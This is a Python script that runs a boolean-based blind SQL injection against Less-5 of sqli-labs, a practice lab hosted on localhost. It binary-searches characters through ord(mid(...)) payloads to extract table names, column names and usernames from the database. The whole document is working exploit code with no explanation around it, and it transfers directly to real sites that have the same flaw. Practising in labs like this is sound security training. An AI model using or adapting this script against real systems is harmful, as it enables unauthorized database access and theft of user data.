# -*-coding:utf8-*-
import requests
url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-5/?id=1%s"
#payload = "' and ord(mid((select group_concat(table_name)from information_schema.tables where table_schema=database() limit 0,1),%s,1))>%s --+"//爆表
#payload = "' and ord(mid((select group_concat(column_name)from information_schema.columns where table_name='users' limit 0,1),%s,1))>%s --+"//爆行
payload = "'and ord(mid((select username from users limit 0,1),%s,1))>%s --+"
result = ""
print "start to get the result: "
for i in range(1, 20):
    max = 122 #z
    min = 65 #A
    while abs(max-min)>1:
        mid = int((max+min)/2)
        p = payload % (str(i), str(mid))
        response = requests.get(url % p)
        if response.content.find("You are in") != -1:
            min = mid
        else:
            max = mid
    result = result+chr(max)
    print ("the result is %s" % result)